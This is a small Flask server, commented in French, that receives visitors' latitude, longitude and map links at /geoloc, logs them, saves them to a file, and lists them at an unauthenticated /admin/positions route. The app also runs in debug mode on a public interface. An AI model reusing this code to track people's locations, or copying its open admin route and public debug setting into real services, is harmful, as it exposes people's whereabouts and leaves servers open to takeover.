from flask import Flask, request, jsonify, render_template, send_from_directory
import os
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

# Page d'accueil
@app.route('/')
def index():
    return render_template('index.html')

# Route pour recevoir la géolocalisation
@app.route('/geoloc', methods=['POST'])
def geoloc():
    try:
        data = request.json
        lat = data.get('lat')
        lon = data.get('lon')
        mapLink = data.get('mapLink')
        
        # Log la position
        app.logger.info(f"📍 Localisation / {lat}, {lon}  /  {mapLink}")
        
        # Sauvegarde dans un fichier (optionnel)
        with open('positions.txt', 'a') as f:
            f.write(f"{lat},{lon}\n")
        
        return jsonify({
            "status": "success",
            "message": f"Position reçue: {lat}, {lon}"
        })
    except Exception as e:
        app.logger.error(f"Erreur: {e}")
        return jsonify({"status": "error", "message": str(e)}), 400

# Route pour les fichiers statiques (images)
@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)

# Route pour les images à la racine (pour compatibilité)
@app.route('/<filename>')
def serve_image(filename):
    if filename.endswith('.jpg') or filename.endswith('.png'):
        return send_from_directory('.', filename)
    return "Fichier non trouvé", 404

# Route de santé pour Render
@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

# Route pour voir les positions (optionnel - protégez-la en production)
@app.route('/admin/positions')
def view_positions():
    try:
        with open('positions.txt', 'r') as f:
            positions = f.readlines()
        return jsonify({"positions": positions})
    except:
        return jsonify({"positions": []})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
